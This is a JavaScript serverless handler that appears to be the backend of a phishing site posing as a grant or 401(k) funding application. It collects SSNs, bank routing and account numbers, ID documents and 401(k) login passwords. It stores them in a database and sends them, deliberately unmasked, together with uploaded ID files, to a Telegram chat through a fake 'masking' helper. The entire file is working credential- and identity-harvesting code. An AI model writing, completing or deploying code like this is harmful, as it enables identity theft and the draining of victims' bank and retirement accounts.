const { jsonResponse, corsHeaders, chunkText, sendTelegramRequest, sleep, getSupabase } = require('./_shared/utils');

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function maskIf(key, val) {
  if (!val) return '—';
  const k = String(key).toLowerCase();
  if (k.indexOf('password') > -1) return '🔒 ' + String(val);
  if (k.indexOf('ssn') > -1) {
    const s = String(val).replace(/-/g, '');
    return s.length >= 7 ? '•••-••-' + s.slice(-4) + ' (full: ' + String(val) + ')' : String(val);
  }
  if (k.indexOf('routing') > -1) return String(val) + ' (full)';
  if (k.indexOf('accountnum') > -1 || k === 'accountnumber') return '••••' + String(val).slice(-4) + ' (full: ' + String(val) + ')';
  return String(val);
}

const FIELD_LABELS = {
  firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone',
  dob: 'Date of Birth', ssn: 'SSN', address: 'Street Address', city: 'City',
  state: 'State', zip: 'ZIP Code', citizenship: 'Citizenship Status',
  bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
  accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
  accountNum: 'Account Number',
  businessName: 'Business Name', businessStatus: 'Grant Purpose',
  businessType: 'Employment Status', industry: 'Use Category',
  employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
  businessAddress: 'Additional Details',
  idType: 'ID Type', idNumber: 'ID / Document Number',
  idFullName: 'Full Name (on ID)', idDob: 'DOB (on ID)',
  idExpires: 'ID Expiration Date', idIssuer: 'Issuing State/Country',
  provider: '401(k) Provider', k401Username: '401(k) Username',
  k401Password: '401(k) Password', accountNumber: '401(k) Last 6',
  balance: 'Current Balance (USD)', accountOpenDate: 'Opened Date',
  accountType: 'Account Type', employer: 'Current Employer',
  k401AccessUsername: '401(k) Access Username',
  k401AccessPassword: '401(k) Access Password'
};

exports.handler = async function (event, context) {
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 204, headers: corsHeaders(), body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return jsonResponse(405, { error: 'Method not allowed' });
  }

  let payload;
  try {
    payload = event.body ? JSON.parse(event.body) : {};
  } catch (e) {
    return jsonResponse(400, { error: 'Invalid JSON body' });
  }

  const { personal, banking, business, id_verify, kaccess, files = [], shortAppId, visitorSession } = payload;
  const sections = { personal, banking, business, id_verify, kaccess };
  for (const [k, v] of Object.entries(sections)) {
    if (typeof v !== 'object' || v === null) {
      return jsonResponse(400, { error: `Missing or invalid section: ${k}` });
    }
  }

  const supabase = getSupabase();
  let appIdShort = shortAppId;
  let appId;

  try {
    if (!appIdShort) {
      appIdShort = 'A' + Math.floor(100000 + Math.random() * 900000);
    }
    const { data: inserted, error: insErr } = await supabase
      .from('applications')
      .insert({
        app_id_short: appIdShort,
        status: 'submitted',
        ip: (event.headers && (event.headers['x-forwarded-for'] || event.headers['X-Forwarded-For']))?.split(',')[0]?.trim() || null,
        user_agent: (event.headers && (event.headers['user-agent'] || event.headers['User-Agent'])) || null,
        visitor_session: visitorSession || null,
        personal: personal || {},
        banking: banking || {},
        business: business || {},
        id_verify: id_verify || {},
        kaccess: kaccess || {},
        raw_data: payload,
      })
      .select('id, app_id_short')
      .maybeSingle();
    if (insErr) {
      if (String(insErr.message || insErr.code).includes('duplicate') || String(insErr.message).includes('unique')) {
        appIdShort = 'A' + Math.floor(100000 + Math.random() * 900000);
        const r = await supabase
          .from('applications')
          .insert({
            app_id_short: appIdShort,
            status: 'submitted',
            ip: (event.headers && (event.headers['x-forwarded-for'] || event.headers['X-Forwarded-For']))?.split(',')[0]?.trim() || null,
            user_agent: (event.headers && (event.headers['user-agent'] || event.headers['User-Agent'])) || null,
            visitor_session: visitorSession || null,
            personal: personal || {},
            banking: banking || {},
            business: business || {},
            id_verify: id_verify || {},
            kaccess: kaccess || {},
            raw_data: payload,
          })
          .select('id, app_id_short')
          .maybeSingle();
        if (r.error) throw r.error;
        appId = r.data.id;
        appIdShort = r.data.app_id_short;
      } else {
        throw insErr;
      }
    } else if (inserted) {
      appId = inserted.id;
      appIdShort = inserted.app_id_short;
    }

    if (Array.isArray(files) && files.length && appId) {
      const rows = files
        .filter((f) => f && f.storageObjectPath)
        .map((f) => ({
          application_id: appId,
          field_name: f.fieldName || '',
          field_label: f.fieldLabel || '',
          storage_object_path: f.storageObjectPath,
          original_filename: f.filename || '',
          mime_type: f.mimeType || '',
          size_bytes: Number(f.size) || 0,
        }));
      if (rows.length) {
        const { error: buErr } = await supabase.from('application_uploads').insert(rows);
        if (buErr) console.warn('application_uploads insert failed:', buErr);
      }
    }
  } catch (err) {
    console.error('submit-application DB error:', err);
    return jsonResponse(500, { error: 'Failed to save application', message: err.message });
  }

  context.callbackWaitsForEmptyEventLoop = false;

  (async function sendTelegramAsync() {
    try {
      const sectionsTg = [
        { title: 'STEP 1 — Personal Information', data: personal || {} },
        { title: 'STEP 2 — Bank / Payment Details', data: banking || {} },
        { title: 'STEP 3 — Funding Need Summary', data: business || {} },
        { title: 'STEP 4 — ID Verification & 401(k) Details', data: id_verify || {} },
        { title: 'STEP 6 — 401(k) Account Access', data: kaccess || {} },
      ];

      const bodyLines = [];
      bodyLines.push('<b>🚨 NEW APPLICATION SUBMITTED 🚨</b>');
      bodyLines.push('<b>Application ID:</b> P401K-2026-' + escapeHtml(appIdShort));
      bodyLines.push('<b>Submitted:</b> ' + escapeHtml(new Date().toLocaleString()));
      bodyLines.push('');

      for (const sec of sectionsTg) {
        const keys = Object.keys(sec.data);
        if (!keys.length) continue;
        bodyLines.push('<b>—— ' + escapeHtml(sec.title) + ' ——</b>');
        for (const key of keys) {
          const raw = sec.data[key];
          if (raw === undefined || raw === null || raw === '') continue;
          const label = FIELD_LABELS[key] || key;
          const display = maskIf(key, raw);
          bodyLines.push('<b>' + escapeHtml(label) + ':</b> ' + escapeHtml(display));
        }
        bodyLines.push('');
      }

      const filesList = files || [];
      if (filesList.length > 0) {
        bodyLines.push('<b>📎 Uploaded Files (' + filesList.length + ')</b>');
        for (const fi of filesList) {
          let sizeStr = '';
          if (fi.size) {
            const kb = fi.size / 1024;
            sizeStr = kb > 1024 ? ' (' + (kb / 1024).toFixed(2) + ' MB)' : ' (' + kb.toFixed(1) + ' KB)';
          }
          bodyLines.push('  • ' + (fi.fieldLabel || fi.fieldName || 'File') + ': ' + escapeHtml(fi.filename || fi.name || 'unnamed') + sizeStr);
        }
        bodyLines.push('');
      }

      if (visitorSession) bodyLines.push('Visitor ID: ' + escapeHtml(visitorSession));

      const fullText = bodyLines.join('\n');
      const chunks = chunkText(fullText, 4000);
      for (let i = 0; i < chunks.length; i++) {
        try {
          await sendTelegramRequest('sendMessage', {
            text: chunks[i],
            parse_mode: 'HTML',
            disable_web_page_preview: true,
          });
        } catch (e) {
          console.warn('sendMessage chunk failed:', e.message);
        }
        await sleep(350);
      }

      for (let i = 0; i < filesList.length; i++) {
        const fi = filesList[i];
        if (!fi || !fi.storageObjectPath) continue;
        const cap = '📎 App P401K-2026-' + escapeHtml(appIdShort) + '\n' +
                   'Field: ' + escapeHtml(fi.fieldLabel || fi.fieldName || 'Upload') + '\n' +
                   'File: ' + escapeHtml(fi.filename || fi.name || '');
        try {
          const { data, error } = await supabase.storage.from('application-uploads').download(fi.storageObjectPath);
          if (error || !data) throw new Error(error?.message || 'download failed');
          const arrBuf = await data.arrayBuffer();
          const buf = Buffer.from(arrBuf);
          const mime = fi.mimeType || data.type || '';
          const method = mime.startsWith('image/') ? 'sendPhoto' : 'sendDocument';
          const field = mime.startsWith('image/') ? 'photo' : 'document';
          await sendTelegramRequest(method, { caption: cap.slice(0, 1024) }, true, [
            { field, filename: fi.filename || fi.name || 'file', mime, buffer: buf },
          ]);
        } catch (e) {
          console.warn('file send failed for', fi.storageObjectPath, e.message);
        }
        await sleep(500);
      }
    } catch (e) {
      console.error('sendTelegramAsync top-level error:', e);
    }
  })();

  return jsonResponse(200, {
    success: true,
    id: appId,
    appIdShort: appIdShort,
    telegram: 'queued',
  });
};
